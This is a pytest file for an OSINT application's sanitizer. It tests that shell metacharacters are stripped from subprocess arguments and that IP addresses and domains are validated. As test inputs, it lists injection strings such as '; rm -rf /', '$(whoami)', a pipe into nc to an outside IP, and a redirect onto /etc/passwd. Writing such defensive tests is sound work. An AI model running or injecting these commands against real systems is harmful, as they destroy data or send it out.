"""Saneamiento de entradas: lo que llega a subprocess y a la BD."""
import pytest

from osint_app.utils import sanitizer as s


@pytest.mark.parametrize("raw", [
    "example.com; rm -rf /", "$(whoami)", "a`id`b", "x | nc 1.2.3.4 80", "a && b", "a > /etc/passwd",
])
def test_shell_arg_strips_metacharacters(raw):
    out = s.sanitize_shell_arg(raw)
    assert not any(ch in out for ch in ";|&`$()<>")


def test_shell_arg_keeps_normal_values():
    assert s.sanitize_shell_arg("normal_user.99") == "normal_user.99"


@pytest.mark.parametrize("ip,ok", [
    ("8.8.8.8", True), ("999.1.1.1", False), ("1.2.3", False), ("abc", False), ("", False),
])
def test_validate_ip(ip, ok):
    assert s.validate_ip(ip) is ok


@pytest.mark.parametrize("domain,ok", [
    ("example.com", True), ("sub.example.co.uk", True),
    ("exa mple.com", False), ("-bad.com", False), ("", False),
])
def test_validate_domain(domain, ok):
    assert s.validate_domain(domain) is ok
